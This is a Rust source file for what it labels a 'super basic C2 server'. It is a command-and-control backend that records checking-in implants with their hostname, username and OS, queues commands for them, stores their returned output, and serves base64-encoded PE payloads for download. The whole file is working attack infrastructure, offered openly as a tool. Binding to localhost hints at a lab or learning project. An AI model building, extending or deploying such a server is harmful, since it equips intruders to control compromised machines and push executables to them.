// ++++++++++++++++++++++++++++++++++++++++
// SUPER BASIC C2 SERVER
// ++++++++++++++++++++++++++++++++++++++++
use axum::{routing::post, routing::get, Router, Json, response::IntoResponse, extract::{State, Path}, http::StatusCode};
use serde::{Deserialize, Serialize};
use std::sync::Arc;
use base64::{engine::general_purpose, Engine as _};

#[derive(Serialize, Deserialize, Clone)]  
struct Task {
    task_id: String,
    command: String,
    args: Vec<String>,
    task_implant_id: String,
}

#[derive(Deserialize, Serialize, Clone)]
struct TaskResult {
    task_id: String,
    output: String,
}

#[derive(Serialize)]
struct CheckinResponse {
    tasks: Vec<Task>,
}

#[derive(Deserialize)]
struct CheckinRequest {
    implant_id: String,
    hostname: String,
    username: String,
    os_info: String,
}

struct AppState {
    db: sqlx::SqlitePool,
}

#[derive(Serialize)]
struct Response {
    results: Vec<TaskResult>,
}

#[derive(Deserialize, Serialize, Clone, sqlx::FromRow)]
struct ImplantData{
    id: String, 
    hostname: String, 
    username: String,
    os_info: String, 
    first_seen: i64, 
    last_seen: i64,
}

#[derive(Serialize)]
struct PayloadResponse {
    pe: String,
}

#[tokio::main]
async fn main() {
    let db = sqlx::SqlitePool::connect("sqlite://rustkit.db?mode=rwc")
        .await
        .expect("Failed to connect to database");

    let schema = std::fs::read_to_string("schema.sql").unwrap();
    for statement in schema.split(';').filter(|s| !s.trim().is_empty()) {
        sqlx::query(statement)
            .execute(&db)
            .await
            .expect("Failed to create table");
    }

    let state = Arc::new(AppState {
        db: db.clone(),
    });

    let app = Router::new()
        .route("/checkin", post(handle_checkin))
        .route("/health", get(check_health))
        .route("/task/add", post(add_task))
        .route("/result", post(submit_result))
        .route("/result", get(get_result))
        .route("/implants", get(view_implants))
        .route("/payload/:filename", get(server_payload))
        .with_state(state);

    let listener = tokio::net::TcpListener::bind("127.0.0.1:3000")
        .await
        .unwrap();

    axum::serve(listener, app)
        .await
        .unwrap();
}

async fn handle_checkin(State(state): State<Arc<AppState>>, Json(payload): Json<CheckinRequest>) -> Result<Json<CheckinResponse>, (StatusCode, String)> {
    println!("Implant {} checked in from {}@{}", 
        payload.implant_id, 
        payload.username, 
        payload.hostname
    );

    let now = chrono::Utc::now().timestamp();

    sqlx::query(
        "INSERT INTO implants (id, hostname, username, os_info, `first_seen`, `last_seen`) 
         VALUES (?, ?, ?, ?, ?, ?)
         ON CONFLICT(id) DO UPDATE SET `last_seen` = ?"
    )
    .bind(&payload.implant_id)
    .bind(&payload.hostname)
    .bind(&payload.username)
    .bind(&payload.os_info)
    .bind(now)
    .bind(now)
    .bind(now)
    .execute(&state.db)
    .await
    .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, format!("Database error: {}", e)))?;

    let tasks = sqlx::query_as::<_, (String, String, String, String)>(
        "SELECT task_id, target_implant_id, command, args FROM tasks WHERE target_implant_id = ?"
    )
    .bind(&payload.implant_id)
    .fetch_all(&state.db)
    .await
    .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, format!("Database error: {}", e)))?;

    let mut task_list = vec![];
    
    for (task_id, _, command, args_json) in tasks {
        let args: Vec<String> = serde_json::from_str(&args_json)
            .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, format!("JSON parse error: {}", e)))?;
        
        task_list.push(Task {
            task_id: task_id.clone(),
            command,
            args,
            task_implant_id: payload.implant_id.clone(),
        });
        
        sqlx::query("DELETE FROM tasks WHERE task_id = ?")
            .bind(&task_id)
            .execute(&state.db)
            .await
            .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, format!("Database error: {}", e)))?;
    }

    let response = CheckinResponse {
        tasks: task_list,
    };

    Ok(Json(response))
}

async fn add_task(State(state): State<Arc<AppState>>, Json(task): Json<Task>) -> Result<String, (StatusCode, String)> {
    let now = chrono::Utc::now().timestamp();
    
    let args_json = serde_json::to_string(&task.args)
        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, format!("JSON error: {}", e)))?;
    
    sqlx::query(
        "INSERT INTO tasks (task_id, target_implant_id, command, args, created_at)
         VALUES (?, ?, ?, ?, ?)"
    )
    .bind(&task.task_id)
    .bind(&task.task_implant_id)
    .bind(&task.command)
    .bind(&args_json)  
    .bind(now)
    .execute(&state.db)
    .await
    .map_err(|e| {
        if e.to_string().contains("UNIQUE constraint") {
            (StatusCode::CONFLICT, "Task ID already exists".to_string())
        } else {
            (StatusCode::INTERNAL_SERVER_ERROR, format!("Database error: {}", e))
        }
    })?;

    Ok("Task added!".to_string())
}

async fn check_health() -> &'static str {
    "Server Running"
}

async fn submit_result(State(state): State<Arc<AppState>>, Json(result): Json<TaskResult>) -> Result<String, (StatusCode, String)> {
    println!("Task {} completed with output: {}", result.task_id, result.output);

    let now = chrono::Utc::now().timestamp();
    
    sqlx::query(
        "INSERT INTO results (task_id, output, received_at) VALUES (?, ?, ?)"
    )
    .bind(&result.task_id)
    .bind(&result.output)
    .bind(now)
    .execute(&state.db)
    .await
    .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, format!("Database error: {}", e)))?;
 
    Ok("Result received".to_string())
}

async fn get_result(State(state): State<Arc<AppState>>) -> Result<Json<Response>, (StatusCode, String)> {
    let results = sqlx::query_as::<_, (i32, String, String, i64)>(
        "SELECT id, task_id, output, received_at FROM results"
    )
    .fetch_all(&state.db)
    .await
    .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, format!("Database error: {}", e)))?;
    
    sqlx::query("DELETE FROM results")
        .execute(&state.db)
        .await
        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, format!("Database error: {}", e)))?;
    
    let task_results: Vec<TaskResult> = results
        .into_iter()
        .map(|(_, task_id, output, _)| TaskResult { task_id, output })
        .collect();
    
    let response = Response {
        results: task_results,
    };
    
    Ok(Json(response))
}

async fn view_implants(State(state): State<Arc<AppState>>) -> Result<Json<Vec<ImplantData>>, (StatusCode, String)> {
    let implants = sqlx::query_as::<_, ImplantData>("SELECT * FROM implants")
        .fetch_all(&state.db)
        .await
        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, format!("Database error: {}", e)))?;
    
    println!("Found {} implants in database", implants.len());
    
    Ok(Json(implants))
}

async fn server_payload(State(state): State<Arc<AppState>>, Path(filename): Path<String>) -> Result<Json<PayloadResponse>, (StatusCode, String)> {
    if !filename.chars().all(|c| c.is_alphanumeric() || c == '.' || c == '_' || c == '-') {
        return Err((StatusCode::BAD_REQUEST, "Invalid filename".to_string()));
    }

    let path = format!("../payload/{}", filename);
    let payload = std::fs::read(&path)
    .map_err(|e| (StatusCode::NOT_FOUND, format!("Failed to read payload: {}", e)))?;

    let encoded_payload = general_purpose::STANDARD.encode(&payload);
     println!("Serving payload: {} ({} bytes, {} base64)", filename, payload.len(), encoded_payload.len());

    Ok(Json(PayloadResponse{
        pe: encoded_payload
    }))
}